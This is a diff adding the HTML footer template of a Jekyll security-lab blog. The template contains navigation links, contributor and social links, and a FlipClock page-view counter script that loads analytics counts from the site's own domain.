+                <!-- 代码引用申明/code reference declaration:
+#############################################################################
+## code from cloudflare. visit footer in https://www.cloudflare.com/zh-cn/ ##
+#############################################################################
+-->
+
+<div id="footerwrap" class="hidden-print">
+    <div class="footer-container">
+        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
+            <div class="footer-row">
+                
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>入门</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">快速开始</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/jekyll/in/linux/" target="_blank">博客搭建</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/nginx/with/jekyll-site/" target="_blank">公网部署</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/tuna/mirror-web/" target="_blank">Jekyll Tuna源码</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>社区</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">Bigger than Bigger</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">Collection Of Verified Vulnerabilities</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">sweet-ysoserial</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>技术栈</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://jekyllrb.com/docs/" target="_blank">Jekyll</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.markdownguide.org/" target="_blank">MarkDown</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.cloudflare.com/waf/" target="_blank">CloudFlare WAF</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://dash.cloudflare.com/dns/" target="_blank">CloudFlare CDN</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/features/actions" target="_blank">Github Action</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>关于</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/about/" target="_blank">近期研究</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/" target="_blank">博客</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bin4xin.github.io/wiki" target="_blank">WIKI</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>贡献者</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/bin4xin" target="_blank">本阿信</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/dnf-2008" target="_blank">夏天の风</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Yang2635" target="_blank">Yang2635</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>其他</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">帮助</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/" target="_blank">隐私</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/#cookie" target="_blank">Cookie偏好</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+            </div><!-- "/row"-->
+            <!--TODO mark-->
+            <span class="btn mr-1 color-border-accent-emphasis" title="Under construction">
+					<div class="fa fa-bug">
+                        <div class="fa fa-hand-point-down"></div>
+                        <a href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/.github/workflows/deploy.yml#L46" target="_blank">
+                        Clock counter Bug need to FIX.</a>
+                    </div>
+            </span>
+
+            <div class="pv2-ns">
+                <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l flex footer-bottom-row-margin">
+                    <!--
+   - FlipClock design
+   -    @link { https://github.com/objectivehtml/FlipClock }
+-->
+<link rel="stylesheet" href="/assets/flipclock/flipclock.css">
+<script src="/assets/flipclock/flipclock.js"></script>
+
+<div class="clock" style="margin-bottom:2em;margin-top:2em;"></div>
+<div class="flex items-center mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns" >
+    
+    
+    
+    <div id="SentinelLAB"><a class="lh-1 dib mr2" title="SentinelLAB" target="_blank" rel="noopener" href="https://www.vulbox.com/team/ERRORS"></a></div>
+    
+    
+    
+    <div id="YouTuBe"><a class="lh-1 dib mr2" title="YouTuBe" target="_blank" rel="noopener" href="https://www.youtube.com/@bin4xin"></a></div>
+    
+    
+    
+    <div id="Twitter"><a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin"></a></div>
+    
+    
+    
+    <div id="Linkedin"><a class="lh-1 dib mr2" title="Linkedin" target="_blank" rel="noopener" href="https://www.linkedin.com/#"></a></div>
+    
+    
+    
+    <div id="Facebook"><a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#"></a></div>
+    
+    
+    
+    <div id="Bilibili"><a class="lh-1 dib mr2" title="Bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/67373868"></a></div>
+    
+</div>
+<!--
+  - Ajax @para counts
+  - Jquery-return-value-undefined @link { https://stackoverflow.com/questions/13848123/jquery-return-value-undefined }
+  -->
+<script>
+    function getGAJson() {
+        let counts = null
+        $.ajax({
+            url: 'https://bin4xin.sentrylab.cn/assets/ga.json',
+            dataType: 'json', // for cross-origin access
+            timeout: 1000 * 10, // 10 secs
+            async: false,
+            success: function(data) { counts = displayPageviews(data.rows); },
+            error: function() { console.log('Failed to load Pageviews!'); }
+        });
+        return counts;
+    }
+    function displayPageviews(rows) {
+        if (rows === undefined) { return; }
+        var curPath = window.location.pathname;
+        var curFile = curPath.slice(curPath.lastIndexOf('/') + 1); // Sometimes posts will be moved.
+        var len = rows.length;
+        var cnt = 0;
+
+        for (var i = 0; i < len; ++i) {
+            var gaPath = rows[i][0];
+            var gaFile = gaPath.slice(gaPath.lastIndexOf('/') + 1);
+
+            if (gaPath === curPath || gaFile === curFile) {
+                cnt += parseInt(rows[i][1]);
+            }
+        }
+        return setInitialCount(cnt);
+        // ref @link
+        //      - { https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE }
+        //      - { https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/ }
+    }
+    // <!-- @link { https://profile-counter.glitch.me/bin4xin.github.io/count.svg } -->
+    function setInitialCount(num) {
+        var init_SiteOffset = 66749;
+        _value_site_pv = parseInt(num)
+        all_counts = init_SiteOffset + _value_site_pv
+        return all_counts
+    }
+    var clock;
+    let All_Counts = getGAJson()
+    $(document).ready(function() {
+            // Instantiate a counter
+            clock = new FlipClock($('.clock'), All_Counts , {
+            clockFace: 'Counter'
+        });
+        // Attach a click event to a button an increment the clock
+        $('.increment').click(function() {
+            //clock.setValue(10); Or you could decrease the clock // clock.decrement();
+            clock.increment();
+            // Or set it to a specific value
+            // clock.setValue(x);
+        });
+        // Attach a click event to a button a decrement the clock
+        $('.decrement').click(function() {
+            clock.decrement();
+        });
+        $('.reset').click(function() {
+            clock.reset();
+        });
+    });
+</script>
+                </div>
+            </div><!-- "/pv5" -->
+        </div>
+    </div>
+    <div class="tertiary d-flex">
+        <div class="wrapper">
+            <div class="col justify-center flex-wrap-l d-flex justify-content-center">
+                <ul class="pa1 table-of-contents flex-xl-justify-between flex-xl-column">
+                    <li class="outstanding"><a>© 2019-2025 SENTRYLAB.CN</a></li>
+                    <li class="outstanding"><a>SENTINEL SECURITY, LAB</a></li>
+                    <li class="outstanding"><a>Jekyll Ver 3.9.3.</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div><!--/footerwrap -->
+
+    </body>
+
+    <script src="/assets/js/copy.js"></script>
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+
+<!--<link rel="preload" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" as="style"/>-->
+<!--<link rel="stylesheet" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" data-n-g=""/>-->
+
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-5 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
